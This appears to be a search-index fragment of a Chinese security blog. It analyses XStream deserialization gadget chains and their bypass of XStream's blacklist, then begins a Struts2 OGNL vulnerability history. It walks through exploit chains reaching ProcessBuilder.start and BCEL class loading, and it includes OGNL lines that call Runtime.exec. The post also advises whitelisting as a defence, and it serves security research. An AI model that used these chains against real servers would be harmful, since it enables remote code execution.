<p>\u5c01\u88c5<code>Runtime</code>\u5bf9\u8c61\uff0c\u5e76\u8bbe\u5b9a\u540e\u7eed\u9700\u8981\u8c03\u7528\u7684\u51fd\u6570<code>exec</code></p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#convertedclosure","title":"ConvertedClosure","text":"<p>\u8fd9\u4e2a<code>ConvertedClosure</code>\u4e5f\u662f\u7ee7\u627f\u4e86<code>InvocationHandler</code>\uff0c\u53ef\u4ee5\u5728\u52a8\u6001\u4ee3\u7406\u4e2d\u4f5c\u4e3ahandler\u7684\u5b58\u5728\uff0c\u6765\u770b\u4e00\u4e0b\u4ed6\u7684invoke</p> <p><code>ConvertedClosure</code>\u8c03\u7528\u7684\u662f\u7236\u7c7b<code>org.codehaus.groovy.runtime.ConversionHandler#invoke</code></p> <p></p> <p>\u4e3b\u8981\u770b\u8fd9\u4e2a\u90e8\u5206\uff0c\u5bf9\u4e8e\u5f53\u524d\u8c03\u7528\u7684\u51fd\u6570\uff0c\u5982\u679c\u975eObject\u7684\u51fd\u6570(\u5982toString\u3001hashCode\u7b49)\uff0c\u5e76\u4e14\u4e0d\u662f<code>GroovyObject</code>\u7684\u51fd\u6570\uff0c\u4f1a\u53bb\u8c03\u7528\u5b50\u7c7b\u7684<code>invokeCustom</code>\uff0c\u8fd9\u91cc\u770b<code>org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom</code></p> <p></p> <p>\u8fd9\u91cc\u7684\u5c5e\u6027\u90fd\u662f\u53ef\u63a7\u7684\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u53bb\u8c03\u7528\u53bb\u8c03\u7528\u524d\u9762\u6784\u9020\u597d\u7684<code>MethodClosure</code>\uff0c\u8fd9\u91cc\u540e\u7eed\u8c03\u7528<code>call</code>\u7684\u8fc7\u7a0b\u53ef\u4ee5\u770b\u6700\u8fd1\u7684\u8fd9\u7bc7\u6587\u7ae0</p> <p>\u6240\u4ee5\u4e3a\u4e86\u6ee1\u8db3\u80fd\u8c03\u7528<code>invokeCustom</code>\u51fd\u6570\uff0c\u524d\u9762\u7684\u4e24\u79cd<code>MapConverter</code>\u548c<code>TreeSetConverter</code>\uff0c\u9009\u54ea\u79cd\u5462\uff1f</p> <p>\u5f88\u660e\u663e\u7b54\u6848\u662f\u9009\u62e9<code>TreeSetConverter</code>\uff0c\u56e0\u4e3a<code>Map</code>\u4f1a\u53bb\u8c03\u7528<code>hashCode</code>\uff0c\u800c<code>TreeSet</code>\u4f1a\u53bb\u8c03\u7528<code>compareTo</code>\uff0c\u8fd9\u91cc\u7684<code>hashCode</code>\u662fObject\u7684\u51fd\u6570\uff0c\u8fc7\u4e0d\u4e86\u4e0a\u9762<code>checkMethod</code>\uff0c\u5177\u4f53\u600e\u4e48\u5199POC\uff0c\u4e0d\u8be6\u7ec6\u8bf4\u4e86\uff0c\u89c1ysomap</p> <p>PS\uff1a\u8fd9\u91cc\u9700\u8981\u63d0\u4e00\u4e0b\u7684\u662f\u7531\u4e8e<code>compareTo</code>\u4f1a\u5e26\u4e0a\u4e00\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u6211\u4eec<code>MethodClosure</code>\u5c01\u88c5\u7684\u540e\u7eed\u9700\u8981\u8c03\u7528\u7684\u51fd\u6570\u5fc5\u987b\u8981\u5b58\u5728\u4e00\u4e2aString\u7c7b\u578b\u7684\u53c2\u6570\uff0c\u4e0d\u7136\u4f1a\u627e\u4e0d\u5230\u51fd\u6570\u62a5\u9519\u3002\uff08\u53ef\u80fd\u8fd8\u6709\u5176\u4ed6\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u6ca1\u7ee7\u7eed\u6df1\u5165\u4e0b\u53bb\u4e86\uff0c\u76f4\u63a5\u6784\u9020<code>Runtime.exec</code>\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff09</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#3-groovy-expando","title":"3. Groovy Expando","text":"<p>\u524d\u9762\u7528\u5230\u4e86<code>TreeSet</code>\u7684\u65b9\u5f0f\uff0c\u8fd9\u91cc\u6211\u4eec\u53bb\u4f7f\u7528<code>Map</code>\u7684\u7c7b\u578b\u6765\u89e6\u53d1\u3002\u4ee5<code>Map</code>\u7684\u7c7b\u578b\u6765\u89e6\u53d1\uff0c\u90a3\u5c31\u662f\u627e\u53ef\u4ee5\u5229\u7528\u7684<code>hashCode</code>\u51fd\u6570</p> <p><code>groovy.util.Expando#hashCode</code></p> <p></p> <p>\u5982\u679c\u5728\u7c7b\u5c5e\u6027<code>expandoProperties</code>\u4e2d\u5b58\u5728<code>hashCode:methodclosure</code>\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u91cc\u76f4\u63a5\u8c03\u7528<code>MethodClosure</code>\u7684<code>call</code>\u51fd\u6570\uff0c\u8ddf\u4e0a\u9762<code>ConvertedClosure</code>\u540e\u7eed\u7684\u8c03\u7528\u4e00\u6837\uff0c\u4f46\u662f\u8fd9\u91cc\u8c03\u7528\u65f6\u6ca1\u6709\u51fd\u6570\u53c2\u6570\u8fc7\u6765\uff0c\u6240\u4ee5\u8fd9\u91cc\u7684\u601d\u8def\u662f<code>ProcessBuilder.start</code>\u6216\u8005fastjson\u90a3\u79cdgetters\u7684\u5229\u7528\uff0c\u89c1POC</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#4-imageiocontainsfilter","title":"4. ImageIO$ContainsFilter","text":"<p>\u4e0a\u9762\u4f7f\u7528\u52a8\u6001\u4ee3\u7406\u7684\u65b9\u5f0f\u5229\u7528\u4e86<code>TreeSet</code>\u8c03\u7528put\u65f6\u89e6\u53d1\u7684<code>compareTo</code>\uff0c\u800c\u8fd9\u91cc\u5229\u7528\u7684\u662f<code>HashMap</code>\u7c7b\u578bput\u65f6\u8c03\u7528\u7684<code>hashCode</code>\u51fd\u6570\uff1b\u8fd9\u4e2a\u94fe\u76f8\u5bf9\u6765\u8bf4\u590d\u6742\u4e00\u70b9\uff0c\u6211\u4eec\u4e00\u70b9\u4e00\u70b9\u6765\u8bf4\uff08\u53c2\u8003marshalsec\u7684ImageIO\uff0c\u8fd9\u91cc\u5148\u819c\u4e00\u6ce2\u5927\u4f6c\u7684\u601d\u8def\uff0c\u540e\u6587\u4e3a\u987a\u52bf\u8bb2\u4e0b\u53bb\u7684\uff0c\u4e3b\u8981\u76ee\u7684\u662f\u5230\u8fbe<code>Iterator.next</code>\uff0c\u5b9e\u9645\u6316\u6398\u8fd9\u79cd\u94fe\u8fd8\u662f\u5f97\u4ece\u540e\u5f80\u524d\u627e\uff09\uff1a</p> <p>\u4eceXStream\u5904\u7406<code>Map</code>\u7c7b\u578b\u65f6\u89e6\u53d1<code>hashCode</code>\u5f00\u59cb</p> <p>\u5173\u6ce8<code>jdk.nashorn.internal.objects.NativeString#hashCode</code></p> <p></p> <p>\u540e\u7eed\u8c03\u7528<code>getStringValue</code>\u51fd\u6570\uff0c\u5728\u8fd9\u4e2a\u51fd\u6570\u91cc\u53bb\u8c03\u7528\u4e86<code>this.value.toString()</code>\uff0c\u8fd9\u91cc\u7684value\u7684\u7c7b\u578b\u4e3a<code>CharSequence</code>\uff0c\u6240\u4ee5\u6211\u4eec\u63a5\u4e0b\u6765\u8981\u627e\u53ef\u4ee5\u5229\u7528\u7684<code>CharSequence</code>\u7684\u5b9e\u73b0\u7c7b\uff0c\u8fd9\u91cc\u7528\u5230\u7684\u662f<code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</code>\u51fd\u6570</p> <p></p> <p>\u8fd9\u91cc\u7d27\u63a5\u7740\u4f1a\u53bb\u8c03\u7528<code>ByteArrayOutputStreamEx</code>\u7684<code>readFrom</code>\uff0c\u8fd9\u4e2a\u51fd\u6570\u7528\u5230\u7684\u4e3b\u8981\u662f\u8fd9\u8fb9\u4f20\u5165\u7684InputStream\u7684read\u51fd\u6570</p> <p></p> <p>\u5b9e\u9645\u4e0a<code>is</code>\u6211\u4eec\u662f\u53ef\u4ee5\u63a7\u5236\u7684\uff0c\u56e0\u4e3a\u8fd9\u91cc\u8c03\u7528\u7684<code>this.dataHandler.getDataSource().getInputStream()</code>\uff0c\u4ed6\u7684\u503c\u4f20\u9012\u90fd\u53ef\u4ee5\u7528\u7c7b\u5c5e\u6027\u7684\u65b9\u5f0f\u628a\u4ed6\u6784\u5efa\u51fa\u6765\uff0c\u5206\u522b\u662f</p> <pre><code>1. this.dataHandler == \u6784\u9020\u597d\u7684DataHandler\n2. DataHandler\u7684dataSource\u5c5e\u6027 == \u6784\u9020\u597d\u7684XmlDataSource\n3. XmlDataSource\u8c03\u7528getInputStream()\u51fd\u6570\u8fd4\u56de\u6784\u9020\u597d\u7684inputStream\n\n// com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\n</code></pre> <p>\u7528\u8fd9\u79cd\u65b9\u6cd5\u5c31\u53ef\u4ee5\u83b7\u53d6\u4e00\u4e2a\u53ef\u63a7\u7684<code>inputStream</code>\uff0c\u5e76\u4e14\u540e\u7eed\u4f1a\u53bb\u8c03\u7528<code>read</code>\u51fd\u6570</p> <p>\u7ee7\u7eed\u770b\u4e0b\u53bb\uff0c<code>javax.crypto.CipherInputStream#read</code></p> <p></p> <p></p> <p>\u6b64\u65f6\u9700\u8981\u6784\u9020\u4e00\u4e2a<code>Cipher</code>\u7c7b\u578b\uff0c\u5e76\u4e14\u540e\u7eed\u8c03\u7528<code>Cipher.update</code>\u51fd\u6570\uff0c\u8fd9\u91cc\u53ef\u4ee5\u7528<code>javax.crypto.NullCipher</code>\u6765\u586b\u5145\uff0c\u56e0\u4e3a\u6700\u7ec8\u7528\u5230\u7684\u662f\u7236\u7c7b<code>Cipher.update</code>\uff0c\u53ea\u8981\u4e0d\u91cd\u8f7d<code>update</code>\uff0c\u5176\u4ed6\u7684\u5b50\u7c7b\u4e5f\u53ef\u4ee5\u3002</p> <p>\u7ee7\u7eed\u770b<code>Cipher.update</code></p> <p></p> <p></p> <p>\u8bf4\u4e86\u90a3\u4e48\u4e45\uff0c\u6211\u4eec\u7ec8\u4e8e\u5230\u4e86\u81f3\u5173\u91cd\u8981\u7684\u4e00\u4e2a\u5730\u65b9\uff0c<code>serviceIterator.next</code>\u51fd\u6570</p> <p>\u540e\u7eed\u6211\u4eec\u5c06\u8c03\u7528ImageIO\u4e0b\u7684<code>javax.imageio.spi.FilterIterator#next</code></p> <p></p> <p></p> <p><code>advance</code>\u51fd\u6570\u4f1a\u53bb\u8c03\u7528<code>filter.filter</code>\u51fd\u6570\uff0c\u800cImageIO\u5b58\u5728\u4e00\u4e2a\u6709\u8da3\u7684filter</p> <p><code>javax.imageio.ImageIO.ContainsFilter#filter</code></p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2aMethod\u5bf9\u8c61\u53bbinvoke\uff0c\u5230\u4e86\u8fd9\u91cc\u5c31\u662f\u6fc0\u52a8\u4eba\u5fc3\u7684Java\u53cd\u5c04\u673a\u5236\u4e86\uff0c\u6211\u4eec\u63d0\u524d\u6784\u9020\u597dmethod\u5bf9\u8c61\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u4efb\u610f\u7684\u51fd\u6570\u3002</p> <p>\u5229\u7528\u94fe\u6bd4\u8f83\u957f\uff0c\u6574\u7406\u4e00\u4e0b\u8fc7\u7a0b</p> <pre><code>XStream \u5904\u7406Map\u7c7b\u578b \u53bb\u8c03\u7528jdk.nashorn.internal.objects.NativeString#hashCode\n    com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString\n    javax.activation.DataHandler#getDataSource\n        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream\n            javax.crypto.CipherInputStream#read -&gt; getMoreData\n            javax.crypto.NullCipher#update -&gt; chooseFirstProvider\n                javax.imageio.spi.FilterIterator#next\n                    javax.imageio.ImageIO.ContainsFilter#filter\n                        ProcessBuilder#start\n</code></pre> <p>\u4ece\u540e\u9762\u5f80\u524d\u770b\u7684\u8bdd\uff0c\u6211\u4eec\u524d\u9762\u505a\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u662f\u4e3a\u4e86\u80fd\u53bb\u89e6\u53d1<code>Iterator.next</code>\uff0c\u800c\u8fd9\u79cd<code>Iterator</code>\u7684\u904d\u5386\u5904\u7406\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u518d\u627e\u5230\u4e00\u5904\uff0c\u4e0b\u4e00\u8282\u5c31\u662f\u4e0d\u7528<code>javax.imageio.ImageIO.ContainsFilter#filter</code>\u6765\u5b9e\u73b0\u5229\u7528\uff0c\u8bf7\u7ee7\u7eed\u5f80\u4e0b\u770bXD</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#5-servicefinderlazyiterator","title":"5. ServiceFinder$LazyIterator","text":"<p>\u601d\u8def\u6765\u81ea\u6587\u7ae01\u3001\u6587\u7ae02</p> <p>\u5148\u6765\u770b\u4e00\u4e0b<code>java.util.ServiceLoader.LazyIterator#next</code></p> <p></p> <p></p> <p>\u5f53\u7c7b\u5c5e\u6027<code>acc</code>\u4e3a\u7a7a\u65f6\uff0c\u4f1a\u53bb\u8c03\u7528<code>nextService</code>\u51fd\u6570\uff0c\u800c\u5728\u8be5\u51fd\u6570\u91cc\u9762\uff0c\u6211\u4eec\u770b\u5230\u4e86\u4ee4\u4eba\u719f\u6089\u7684<code>Class.forName</code>\u7684\u8c03\u7528\u3002\u5e76\u4e14\u6211\u4eec\u53bb\u5b9e\u4f8b\u5316\u7684<code>classname</code>\u3001<code>loader</code>\uff0c\u90fd\u662f\u7c7b\u5c5e\u6027\uff0c\u5c5e\u4e8e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u4e1c\u897f\u3002</p> <p>\u5230\u4e86\u8fd9\u91cc\u81ea\u7136\u800c\u7136\u7684\u5c31\u60f3\u5230\u4e86\u4f7f\u7528BCEL\u7684ClassLoader\u6765\u8f7d\u5165classname\u91cc\u7684\u5b57\u8282\u7801\u4e86(\u8fd9\u91cc\u6211\u5728fastjson\u90a3\u7bc7\u91cc\u63d0\u5230\u8fc7)\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728ImageIO\u90a3\u6761\u94fe\u7684\u57fa\u7840\u4e0a\uff0c\u5728\u89e6\u53d1<code>Iterator.next</code>\u65f6\u4f7f\u7528\u8fd9\u4e2a<code>LazyIterator</code>\u6765\u4ee3\u66ff</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#bcel-classloaderpoc","title":"\u4fee\u6539BCEL ClassLoader\u6784\u9020POC","text":"<p>\u8fd9\u91cc\u6765\u63d0\u4e00\u4e0b\u5173\u4e8ePOC\u7684\u6784\u9020\uff0c\u5982\u679c\u4f60\u4f7f\u7528\u4e86\u5f53\u524d\u8fd9\u4e2a\u5229\u7528\u94fe\uff0c\u5e76\u4e14\u4e0d\u5bf9<code>ClassLoader</code>\u505a\u5904\u7406\u7684\u8bdd\uff0c\u4f60\u4f1a\u53d1\u73b0\u600e\u4e48\u90fd\u6253\u4e0d\u901a\uff0c\u56e0\u4e3a\u8fd9\u91cc\u5728\u5b9e\u9645\u8fd8\u539f<code>ClassLoader</code>\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u9519\u8bef</p> <p></p> <p>\u8fd9\u91cc\u6709\u4e24\u79cd\u89e3\u51b3\u65b9\u6848\uff0c\u4e00\u662f\u53bb\u9664\u8fd9\u79cd\u8fd8\u539f\u6709\u95ee\u9898\u7684\u7c7b\uff08\u4f1a\u5f88\u9ebb\u70e6\uff09\uff0c\u4e8c\u662f\u76f4\u63a5\u628a<code>ClassLoader</code>\u91cc\u7684\u4e00\u4e9b\u65e0\u5173\u7d27\u8981\u7684\u4e1c\u897f\u5254\u9664\u6389\u3002</p> <p>\u8fd9\u91cc\u6211\u9009\u62e9\u4e86\u7b2c\u4e8c\u79cd\uff0c\u7ecf\u8fc7\u8c03\u8bd5\u53bb\u9664\u4e86\u4ee5\u4e0b\u51e0\u4e2a\u5c5e\u6027\u7684\u503c</p> <p></p> <p>\u8fd9\u91cc\u7531\u4e8e\u6211\u4eec\u5254\u9664\u4e86<code>ignored_packages</code>\u548c<code>deferTo</code>\uff0c\u5bfc\u81f4BCEL\u7684ClassLoader\u5728\u8f7d\u5165\u666e\u901a\u7684\u7c7b\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u52a0\u8f7d\u9519\u8bef\u7684\u95ee\u9898</p> <p></p> <p>\u6765\u770b\u770b\u600e\u4e48\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898</p> <p>\u9996\u5148BCEL\u7684<code>ClassLoader.loadClass</code>\uff0c\u4e00\u5171\u5c1d\u8bd54\u6b21\u4e0d\u540c\u7684\u8f7d\u5165\u65b9\u6cd5</p> <ol> <li>\u4ece\u5f53\u524dClassLoader\u7684classes\u53bb\u627e</li> </ol> <p></p> <ol> <li>\u5bf9\u4e8e\u9ed8\u8ba4\u5ffd\u7565\u7684\u5305<code>java./sun./javax.</code>\uff0c\u4f7f\u7528<code>deferTo</code>\u53bb\u91cd\u65b0\u52a0\u8f7d\uff0c\u8fd9\u91cc\u7684<code>deferTo</code>\u662f\u7cfb\u7edf\u7684ClassLoader\uff08<code>ClassLoader.getSystemClassLoader()</code>)</li> </ol> <p></p> <ol> <li>\u5bf9\u4e8eclassname\u4ee5<code>$$BCEL$$</code>\u5f00\u5934\u7684\uff0c\u6839\u636eclassname\u7684\u503c\u53bbdefineClass\uff0c\u8fd9\u8fb9\u5c31\u662f\u6211\u4eec\u6700\u559c\u6b22\u7684\u4efb\u610f\u8f7d\u5165\u5b57\u8282\u7801\u7684\u5730\u65b9</li> </ol> <p></p> <ol> <li>\u6700\u540e\u4e00\u6b21\u662f\u7528<code>repository</code>\u53bb\u8f7d\u5165\u5f53\u524d\u7684classname\uff0c\u5982\u679c\u8fd9\u91cc\u8fd8\u6ca1\u627e\u5230\uff0c\u5c31\u4f1a\u7206\u6ca1\u6709\u627e\u5230Class\u7684\u9519\u8bef</li> </ol> <p></p> <p>PS\uff1a\u8fd9\u90e8\u5206<code>repository</code>\u53d6\u7684<code>SyntheticRepository.getInstance()</code>\uff0c\u8fd8\u4e0d\u662f\u5f88\u6e05\u695a\u8fd9\u4e2a\u5de6\u53f3\uff0c\u540e\u7eed\u6574\u7406\u4e00\u4e0bClassLoader\u76f8\u5173\u7684\u77e5\u8bc6\u518d\u505a\u8865\u5145</p> <p>\u518d\u6765\u770b\u6211\u4eec\u62a5\u9519\u7684\u539f\u56e0\uff0c\u56e0\u4e3a\u5220\u9664<code>ignored_packages</code>\u548c<code>deferTo</code>\u4e4b\u540e\uff0c\u76f8\u5f53\u4e8e\u7b2c\u4e8c\u79cd\u60c5\u51b5\u65e0\u6cd5\u8f7d\u5165\u4e86\uff0c\u800c\u663e\u7136<code>java.lang.Object</code>\u4e0d\u7b26\u5408\u7b2c\u4e09\u79cd\u60c5\u51b5\u3002\u6700\u540e\u7b2c4\u79cd\u91cc\u9762\u4e5f\u6ca1\u6709\u627e\u5230\u8fd9\u4e2a<code>java.lang.Object</code>\uff0c\u6240\u4ee5\u6700\u7ec8\u7206\u4e86<code>ClassNotFoundException</code></p> <p>\u8fd9\u91cc\u5176\u5b9e\u5df2\u7ecf\u5f88\u660e\u663e\u4e86\uff0c\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u5f97\u5728<code>classes</code>\u91cc\u6dfb\u52a0\u6211\u4eec\u4f20\u5165\u7684class\u5b57\u8282\u7801\u91cc\u6240\u7528\u5230\u7684\u6240\u6709\u7c7b\uff0c\u90a3\u4e48\u5728\u7b2c\u4e00\u6b21\u5c1d\u8bd5\u8f7d\u5165\u7684\u65f6\u5019\uff0c\u5c31\u627e\u5230\u4e86\u76f8\u5e94\u7684\u7c7b\uff0c\u65e0\u9700\u5c1d\u8bd5\u540e\u7eed\u7684\u51e0\u79cd\u8f7d\u5165\u65b9\u5f0f\u3002</p> <p>\u6bd4\u5982\u8fd9\u91cc\u6211\u4ea7\u751f\u7684\u5b57\u8282\u7801\u91cc\u9762\u7528\u4e0a\u4e86<code>Runtime</code>\uff0c\u5c31\u5f97\u52a0\u4e0a\u8fd9\u4e2a\u7c7b</p> <p></p> <p>\u8fd9\u91cc\u7684Object\u5fc5\u987b\u52a0\u4e0a\uff0c\u6bd5\u7adf\u6240\u6709\u7684\u5bf9\u8c61\u90fd\u7ee7\u627f\u81eaObject</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#0x03-xstream","title":"0x03 XStream\u7684\u9632\u5fa1\u63aa\u65bd","text":"<p>XStream\u57281.4.7\u7248\u672c\u4e4b\u540e\u652f\u6301\u4f7f\u7528\u767d\u540d\u5355\u548c\u9ed1\u540d\u5355\u7684\u65b9\u5f0f\u6765\u65b9\u5f0f\u6076\u610f\u7c7b\u7684\u53cd\u5e8f\u5217\u5316security</p> <p>Starting with XStream 1.4.7, it is possible to define permissions for types, to check the type of an object that should be unmarshalled. Those permissions can be used to allow or deny types explicitly With these permissions it is at least not possible to inject unexpected types into an object graph. The security framework supports the setup of a black or white listing scenario. Any application should use this feature to limit the danger of arbitrary command execution if it deserializes data from an external source.</p> <p>XStream itself sets up a black list by default, i.e. it blocks all currently known critical classes of the Java runtime. Main reason for the black list is compatibility, because otherwise newer versions of XStream 1.4.x can no longer be used as drop-in replacement. Unfortunately this provides a false sense of security. Every XStream client should therefore switch to a white listing on its own as soon as possible. XStream itself will use white listing as default starting with 1.5.x and only clients that have also changed their setup will be able to use this newer version again as drop-in replacement.</p> <p>\u8fd9\u91cc\u4e3b\u8981\u770b\u4e00\u4e0b\u9ed1\u540d\u5355\u7684\u5904\u7406</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#147-149","title":"1.4.7-1.4.9","text":"<p><code>EventHandler</code>\u7684\u5904\u7406\u7531<code>ReflectionConverter</code>\u6765\u5904\u7406\u7684\uff0c\u57281.4.7-1.4.9\u7248\u672c\uff0c\u5728<code>canConvert</code>\u5904\u6dfb\u52a0\u4e86\u5bf9<code>EventHandler</code>\u7684\u9650\u5236</p> <p></p> <p>\u6240\u4ee5<code>EventHandler</code>\u7684POC\u5c31\u5931\u6548\u4e86\uff0c\u4f46\u662f\u5176\u4ed6\u7684\u51e0\u79cd\u5e76\u6ca1\u6709\u5931\u6548</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#1410","title":"&gt;=1.4.10","text":"<p>\u57281.4.10\u7248\u672c\u589e\u52a0\u4e86<code>setupDefaultSecurity</code>\u65b9\u5f0f\u6765\u8bbe\u7f6e\u9ed8\u8ba4\u7684\u767d\u540d\u5355\uff0c\u4f46\u662f\u8fd9\u4e2a\u7248\u672c\u628a\u4e0a\u9762<code>EventHandler</code>\u7684\u9650\u5236\u53bb\u6389\u4e86\uff0c\u5bfc\u81f4\u53c8\u53ef\u4ee5\u4f7f\u7528\u6700\u65e9\u7684POC\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u662f\u6ca1\u4fee\u8865\u524d\u7684<code>1.4.10</code>\uff0c\u4fee\u590d\u540e\u5df2\u7ecf\u4e0d\u53ef\u4ee5\u4e86</p> <p>\u9664\u4e86\u65b0\u589e\u8bbe\u7f6e\u767d\u540d\u5355\u7684\u65b9\u5f0f\uff0c\u4e5f\u65b0\u589e\u52a0\u4e86<code>InternalBlackList</code>\u8fd9\u4e2aconverter\uff0c\u4ed6\u8bbe\u7f6e\u7684\u6743\u9650\u4e3a<code>LOW</code>\uff0c\u800c<code>ReflectionConverter</code>\u6743\u9650\u4e3a<code>Very_low</code>\uff0c\u6240\u4ee5\u4f1a\u5148\u8fc7\u4e00\u6b21\u9ed1\u540d\u5355\u68c0\u67e5\uff08XStream\u5728\u6ce8\u518cconverters\u65f6\uff0c\u4ee5\u6743\u9650\u7684\u65b9\u5f0f\u6765\u51b3\u5b9a\u6b21\u5e8f\uff09\u3002</p> <p></p> <p>\u6240\u4ee5\u8fd9\u91cc1,4,5\u90fd\u8dea\u4e86\uff0c\u53ea\u5269\u4e0bgroovy\u8fd9\u79cd\u4e86\uff0c\u5f53\u7136\u80af\u5b9a\u8fd8\u6709\u5176\u4ed6\u6ca1\u6709\u53d1\u73b0\u7684\u5229\u7528\u94fe\uff0c\u6240\u4ee5\u6700\u5b89\u5168\u7684\u65b9\u6cd5\u8fd8\u662f\u4f7f\u7528\u767d\u540d\u5355\u7684\u65b9\u5f0f\uff0c\u4e0d\u80fd\u4f9d\u8d56XStream\u7684\u9ed1\u540d\u5355\u6765\u505a\u5b89\u5168\u9632\u5fa1\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#0x04","title":"0x04 \u603b\u7ed3","text":"<p>\u672c\u6587\u4e3b\u8981\u56de\u987e\u4e86\u73b0\u6709\u7684\u4e00\u4e9b\u5229\u7528\u94fe\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a</p> <p>\u5982\u679cXStream\u7528\u7684\u4e0d\u662f\u767d\u540d\u5355\u6a21\u5f0f\uff0c\u8fd8\u662f\u5b58\u5728\u5229\u7528\u7684\u53ef\u80fd\u6027\u7684\u3002\u73b0\u6709\u5185\u7f6e\u7684\u9ed1\u540d\u5355\u53ea\u7981\u6b62\u4e86\u51e0\u4e2a\u73b0\u6709\u7684\u5229\u7528\u94fe\uff0c\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u627e\u5230\u5176\u4ed6\u53ef\u4ee5\u5229\u7528\u7684\u5229\u7528\u94fe\u7684\uff0c\u6bd4\u5982\u524d\u9762\u63d0\u5230\u7684Groovy\u7684\u5229\u7528\u94fe\u3002</p> <p>\u9700\u8981\u8bb0\u4f4f\u7684\u662fXStream\u4ed6\u7684\u89e6\u53d1\u65b9\u5f0f\u4f9d\u8d56\u7684\u662fHashMap\u3001TreeSet\u8fd9\u79cd\u7c7b\u578b\u81ea\u52a8\u8c03\u7528\u7684<code>hashCode</code>\u3001<code>compareTo</code>\u4e32\u8d77\u6765\u7684\uff0c\u540e\u7eed\u53ef\u4ee5\u6ce8\u610f\u4e00\u4e0b\u8fd9\u79cd\u53ef\u80fd\u7684\u8c03\u7528\u94fe\u3002</p> <p>PS\uff1a\u672c\u6587\u63d0\u5230\u7684\u6240\u6709POC\uff0c\u5df2\u7ecf\u66f4\u65b0\u5230GitHub\u4e0a</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/","title":"struts2\u5386\u53f2\u6f0f\u6d1e\u5206\u6790","text":"","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#0x00","title":"0x00 \u524d\u8a00","text":"<p>17\u5e74\u7684\u65f6\u5019\u6574\u7406\u8fc7struts2\u76f8\u5173\u7684POC\uff0c\u65f6\u96943\u5e74\uff0c\u867d\u7136struts2\u5df2\u7ecf\u4e0d\u518d\u90a3\u4e48\u6d41\u884c\u4e86\uff0c\u4f46\u662f\u8fd8\u662f\u6709\u5f88\u5927\u7684\u7814\u7a76\u4ef7\u503c\uff0c\u672c\u6587\u5c06\u4e00\u70b9\u4e00\u70b9\u8ddf\u4e00\u4e0bstruts2 \u6709\u4ef7\u503c\u7684\u6f0f\u6d1eXD</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#0x01","title":"0x01 \u57fa\u7840","text":"<p>struts2 \u6e90\u7801\u4e0b\u8f7dhttps://archive.apache.org/dist/struts/source/</p> <p>struts2\u5de5\u4f5c\u6d41\u7a0b https://blog.csdn.net/snow_7/article/details/51513381</p> <p>ognl\u8868\u8fbe\u5f0fhttps://www.cnblogs.com/renchunxiao/p/3423299.html</p> <p>struts2 \u6280\u672f\u5185\u5e55 \u7b2c6\u7ae0 OGNL</p> <p>struts2\u6f0f\u6d1e\u7684\u4ea7\u751f\u901aOGNL\u8868\u8fbe\u5f0f\u7684\u6267\u884c\u6709\u5f88\u5927\u7684\u5173\u8054\uff0c\u5386\u53f2\u4e0a\u5f88\u591a\u7248\u672c\u7684\u6f0f\u6d1e\uff0c\u90fd\u662f\u56e0\u4e3a\u4e0d\u5b89\u5168\u7684\u7528\u6237\u8f93\u5165\u6d41\u8f6c\u5230\u4e86<code>Ognl.getValue</code>\u3001<code>Ognl.setValue</code>\u800c\u5bfc\u81f4\u7684OGNL\u8868\u8fbe\u5f0f\u7684\u8ba1\u7b97\u3002\u540e\u6587\u4e0d\u5bf9Ognl\u540e\u7eed\u7684\u5185\u5bb9\u505a\u5206\u6790</p> <pre><code>// \u8c03\u7528\u9759\u6001\u51fd\u6570 \u6267\u884c\u547d\u4ee4\nOgnl.getValue(\"@java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app/')\", context);\nOgnl.setValue(\"(\\\"@java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app/\\')\\\")(bla)(bla)\",context,\"\");\n</code></pre> <p>\u66f4\u591a\u7528\u6cd5\u770bhttp://commons.apache.org/proper/commons-ognl/language-guide.html</p> <p>\u5176\u4e2d\u5173\u4e8e<code>setValue</code>\u7684\u5229\u7528\u7528\u7684\u662fExpression 